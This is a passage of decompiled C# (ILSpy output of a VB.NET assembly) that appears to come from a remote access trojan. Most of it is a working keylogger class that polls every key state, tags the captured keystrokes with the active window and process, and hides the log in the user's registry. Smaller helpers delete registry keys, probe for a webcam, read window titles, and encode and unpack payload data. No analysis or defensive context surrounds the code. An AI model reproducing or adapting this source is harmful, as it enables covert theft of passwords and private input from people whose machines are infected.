			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						break;
					case 62:
						{
							num = num2;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num + 1;
							num = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 3:
								goto end_IL_0001_3;
							}
							goto default;
						}
						end_IL_0001_2:
						break;
					}
					num2 = 2;
					Registry.CurrentUser.OpenSubKey(P).DeleteValue(N);
					break;
					end_IL_0001:;
				}
				catch (object obj) when ((obj is Exception) & (num3 != 0) & (num == 0))
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 62;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public void DS(string P, string N)
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num = default(int);
			int num2 = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						break;
					case 63:
						{
							num = num2;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num + 1;
							num = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 3:
								goto end_IL_0001_3;
							}
							goto default;
						}
						end_IL_0001_2:
						break;
					}
					num2 = 2;
					Registry.CurrentUser.OpenSubKey(P, writable: true).DeleteSubKeyTree(N);
					break;
					end_IL_0001:;
				}
				catch (object obj) when ((obj is Exception) & (num3 != 0) & (num == 0))
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 63;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		public string T64(byte[] b)
		{
			return Convert.ToBase64String(b);
		}

		public byte[] F64(string s)
		{
			return Convert.FromBase64String(s);
		}

		public byte[] SB(string s)
		{
			return Encoding.Default.GetBytes(s);
		}

		public string BS(byte[] b)
		{
			return Encoding.Default.GetString(b);
		}

		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		public string CM()
		{
			checked
			{
				try
				{
					int num = 0;
					int num2;
					int num3;
					do
					{
						short wDriver = (short)num;
						string lpszName = Strings.Space(100);
						string lpszVer = null;
						if (capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
						{
							return "Yes";
						}
						num++;
						num2 = num;
						num3 = 4;
					}
					while (num2 <= num3);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return "No";
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

		public string AW()
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}

		public byte[] Unzip(byte[] data)
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(data, 0, data.Length);
			memoryStream.Position = 0L;
			GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
			MemoryStream memoryStream2 = new MemoryStream();
			byte[] array = new byte[64];
			int num = -1;
			for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
			{
				memoryStream2.Write(array, 0, num);
			}
			gZipStream.Close();
			return memoryStream2.ToArray();
		}

		public Array FX(byte[] b, string spl)
		{
			object instance = new List<byte[]>();
			object obj = new MemoryStream();
			object obj2 = new MemoryStream();
			string[] array = Strings.Split(Encoding.Default.GetString(b), spl);
			object[] array2 = new object[3]
			{
				b,
				0,
				array[0].Length
			};
			object[] arguments = array2;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, null, "Write", arguments, null, null, array3, IgnoreReturn: true);
			if (array3[0])
			{
				b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
			}
			object[] array4 = checked(new object[3]
			{
				b,
				array[0].Length + spl.Length,
				b.Length - (array[0].Length + spl.Length)
			});
			object[] arguments2 = array4;
			array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj2, null, "Write", arguments2, null, null, array3, IgnoreReturn: true);
			if (array3[0])
			{
				b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(byte[]));
			}
			array2 = new object[1];
			object[] array5 = array2;
			object instance2 = obj;
			array5[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance2, null, "ToArray", new object[0], null, null, null));
			array4 = array2;
			object[] arguments3 = array4;
			array3 = new bool[1] { true };
			NewLateBinding.LateCall(instance, null, "Add", arguments3, null, null, array3, IgnoreReturn: true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(instance2, null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array4[0]) }, null, null, OptimisticSet: true, RValueBase: false);
			}
			object[] array6 = new object[1];
			object[] array7 = array6;
			instance2 = obj2;
			array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance2, null, "ToArray", new object[0], null, null, null));
			array2 = array6;
			object[] arguments4 = array2;
			array3 = new bool[1] { true };
			NewLateBinding.LateCall(instance, null, "Add", arguments4, null, null, array3, IgnoreReturn: true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(instance2, null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, null, null, OptimisticSet: true, RValueBase: false);
			}
			NewLateBinding.LateCall(obj, null, "Dispose", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(obj2, null, "Dispose", new object[0], null, null, null, IgnoreReturn: true);
			return (Array)NewLateBinding.LateGet(instance, null, "ToArray", new object[0], null, null, null);
		}

		public object EC(string Input)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input));
		}

		public object DC(string Input)
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(Input));
		}

		public ImageCodecInfo GetEncoderInfo(string M)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = imageEncoders.Length;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				if (Operators.CompareString(imageEncoders[num2].MimeType, M, TextCompare: false) == 0)
				{
					return imageEncoders[num2];
				}
				num2 = checked(num2 + 1);
			}
			return null;
		}
	}
	public class LG
	{
		private int LastAV;

		private string LastAS;

		private Keys lastKey;

		public object vn;

		public string VL;

		public Clock Clock;

		public string Logs;

		private object keyboard;

		public LG()
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			base..ctor();
			lastKey = (Keys)0;
			vn = DateTime.Now.Date;
			Clock = new Clock();
			Logs = "";
			keyboard = (object)new Keyboard();
		}

		public void start()
		{
			B b = new B();
			Thread thread = new Thread(WRK, 1);
			thread.Start();
		}

		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		[DllImport("user32.dll")]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetKeyboardLayout(int dwLayout);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern short GetAsyncKeyState(int vKey);

		private string AV()
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				object processById = Process.GetProcessById(lpdwProcessID);
				if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(foregroundWindow.ToInt32() == LastAV, Operators.CompareObjectEqual(LastAS, NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null), TextCompare: false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null), null, "Length", new object[0], null, null, null), 0, TextCompare: false))))
				{
					LastAV = foregroundWindow.ToInt32();
					LastAS = Conversions.ToString(NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null));
					return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat("\r\n\u0001" + HM(), " "), NewLateBinding.LateGet(processById, null, "ProcessName", new object[0], null, null, null)), " "), LastAS), '\u0001'), "\r\n"));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return "";
		}

		private string HM()
		{
			string result;
			try
			{
				result = Clock.LocalTime.ToString("yy/MM/dd");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = "??/??/??";
				ProjectData.ClearProjectError();
			}
			return result;
		}

		private static string VKCodeToUnicode(uint VKCode)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[255];
				if (!GetKeyboardState(lpKeyState))
				{
					return "";
				}
				uint wScanCode = MapVirtualKey(VKCode, 0u);
				IntPtr foregroundWindow = GetForegroundWindow();
				int lpdwProcessID = 0;
				int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				IntPtr dwhkl = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
				ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
				return stringBuilder.ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return ((Enum)(Keys)checked((int)VKCode)).ToString();
		}

		public string FIX(Keys k)
		{
			//IL_0234: Unknown result type (might be due to invalid IL or missing references)
			//IL_023a: Expected I4, but got Unknown
			//IL_0215: Unknown result type (might be due to invalid IL or missing references)
			//IL_021b: Expected I4, but got Unknown
			//IL_0058: Unknown result type (might be due to invalid IL or missing references)
			//IL_0059: Unknown result type (might be due to invalid IL or missing references)
			//IL_005c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Invalid comparison between Unknown and I4
			//IL_0062: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Invalid comparison between Unknown and I4
			//IL_0097: Unknown result type (might be due to invalid IL or missing references)
			//IL_009e: Invalid comparison between Unknown and I4
			//IL_0076: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a7: Invalid comparison between Unknown and I4
			//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b2: Invalid comparison between Unknown and I4
			//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ba: Invalid comparison between Unknown and I4
			//IL_00be: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c5: Invalid comparison between Unknown and I4
			//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cd: Invalid comparison between Unknown and I4
			//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d8: Invalid comparison between Unknown and I4
			//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e3: Invalid comparison between Unknown and I4
			//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ee: Invalid comparison between Unknown and I4
			//IL_00f2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f6: Invalid comparison between Unknown and I4
			//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
			//IL_00fe: Invalid comparison between Unknown and I4
			//IL_0102: Unknown result type (might be due to invalid IL or missing references)
			//IL_0106: Invalid comparison between Unknown and I4
			//IL_010a: Unknown result type (might be due to invalid IL or missing references)
			//IL_010e: Invalid comparison between Unknown and I4
			//IL_0112: Unknown result type (might be due to invalid IL or missing references)
			//IL_0116: Invalid comparison between Unknown and I4
			//IL_011a: Unknown result type (might be due to invalid IL or missing references)
			//IL_011e: Invalid comparison between Unknown and I4
			//IL_0122: Unknown result type (might be due to invalid IL or missing references)
			//IL_0126: Invalid comparison between Unknown and I4
			//IL_012a: Unknown result type (might be due to invalid IL or missing references)
			//IL_012e: Invalid comparison between Unknown and I4
			//IL_0132: Unknown result type (might be due to invalid IL or missing references)
			//IL_0136: Invalid comparison between Unknown and I4
			//IL_013a: Unknown result type (might be due to invalid IL or missing references)
			//IL_013e: Invalid comparison between Unknown and I4
			//IL_0142: Unknown result type (might be due to invalid IL or missing references)
			//IL_0146: Invalid comparison between Unknown and I4
			//IL_014a: Unknown result type (might be due to invalid IL or missing references)
			//IL_014e: Invalid comparison between Unknown and I4
			//IL_0152: Unknown result type (might be due to invalid IL or missing references)
			//IL_0156: Invalid comparison between Unknown and I4
			//IL_0170: Unknown result type (might be due to invalid IL or missing references)
			//IL_0174: Invalid comparison between Unknown and I4
			//IL_018a: Unknown result type (might be due to invalid IL or missing references)
			//IL_018e: Invalid comparison between Unknown and I4
			//IL_0190: Unknown result type (might be due to invalid IL or missing references)
			//IL_0194: Invalid comparison between Unknown and I4
			//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
			//IL_01d4: Invalid comparison between Unknown and I4
			//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
			bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(keyboard, null, "ShiftKeyDown", new object[0], null, null, null));
			if (Conversions.ToBoolean(NewLateBinding.LateGet(keyboard, null, "CapsLock", new object[0], null, null, null)))
			{
				flag = !flag;
			}
			string result;
			string text;
			try
			{
				if ((int)k == 46 || (int)k == 8)
				{
					result = "[" + ((Enum)k).ToString() + "]";
					goto IL_0255;
				}
				if (((int)k == 160 || (int)k == 161 || (int)k == 65536 || (int)k == 16 || (int)k == 131072 || (int)k == 17 || (int)k == 163 || (int)k == 162 || (int)k == 262144 || (int)k == 112 || (int)k == 113 || (int)k == 114 || (int)k == 115 || (int)k == 116 || (int)k == 117 || (int)k == 118 || (int)k == 119 || (int)k == 120 || (int)k == 121 || (int)k == 122 || (int)k == 123 || (int)k == 35) ? true : false)
				{
					result = "";
					goto IL_0255;
				}
				if ((int)k == 32)
				{
					result = " ";
					goto IL_0255;
				}
				if ((int)k == 13 || (int)k == 13)
				{
					result = ((!Logs.EndsWith("[ENTER]\r\n")) ? "[ENTER]\r\n" : "");
					goto IL_0255;
				}
				if ((int)k == 9)
				{
					result = "[TAP]\r\n";
					goto IL_0255;
				}
				checked
				{
					if (flag)
					{
						result = VKCodeToUnicode((uint)k).ToUpper();
						goto IL_0255;
					}
					text = VKCodeToUnicode((uint)k);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				if (flag)
				{
					text = Strings.ChrW((int)k).ToString().ToUpper();
					result = text;
					ProjectData.ClearProjectError();
					goto IL_0255;
				}
				text = Strings.ChrW((int)k).ToString().ToLower();
				ProjectData.ClearProjectError();
			}
			result = text;
			goto IL_0255;
			IL_0255:
			return result;
		}

		public void WRK()
		{
			//IL_007b: Unknown result type (might be due to invalid IL or missing references)
			//IL_007d: Unknown result type (might be due to invalid IL or missing references)
			//IL_00be: Unknown result type (might be due to invalid IL or missing references)
			//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				Logs = Conversions.ToString(Registry.CurrentUser.CreateSubKey("Software\\" + VL + "\\log").GetValue(Conversions.ToString(DateTime.Now.Date), ""));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			checked
			{
				try
				{
					int num = 0;
					while (true)
					{
						num++;
						int num2 = 0;
						int num3;
						int num4;
						do
						{
							if (GetAsyncKeyState(num2) == -32767)
							{
								Keys k = (Keys)num2;
								string text = FIX(k);
								if (text.Length > 0)
								{
									Logs += AV();
									Logs += text;
								}
								lastKey = k;
							}
							num2++;
							num3 = num2;
							num4 = 255;
						}
						while (num3 <= num4);
						if (num == 1000)
						{
							num = 0;
							int num5 = 20480;
							if (Logs.Length > num5)
							{
								Logs = Logs.Remove(0, Logs.Length - num5);
							}
							try
							{
								Registry.CurrentUser.CreateSubKey("Software\\" + VL + "\\log").SetValue(Conversions.ToString(vn), Logs);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						Thread.Sleep(1);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
namespace B.My.Resources
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0")]
	[CompilerGenerated]
	[HideModuleName]
	[StandardModule]
	[DebuggerNonUserCode]
	internal sealed class Resources
	{
		private static ResourceManager resourceMan;

		private static CultureInfo resourceCulture;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				if (object.ReferenceEquals(resourceMan, null))
				{
					ResourceManager resourceManager = new ResourceManager("B.Resources", typeof(Resources).Assembly);
					resourceMan = resourceManager;
				}
				return resourceMan;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return resourceCulture;
			}
			set
			{
				resourceCulture = value;
			}
		}
	}
}
namespace B.My
{
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "9.0.0.0")]
	internal sealed class MySettings : ApplicationSettingsBase
	{
		private static MySettings defaultInstance = (MySettings)(object)SettingsBase.Synchronized((SettingsBase)(object)new MySettings());

		public static MySettings Default => defaultInstance;

		[DebuggerNonUserCode]
		public MySettings()
		{
		}
	}
	[DebuggerNonUserCode]
	[CompilerGenerated]
	[StandardModule]
	[HideModuleName]
	internal sealed class MySettingsProperty
	{
		[HelpKeyword("My.Settings")]
		internal static MySettings Settings => MySettings.Default;
	}
}
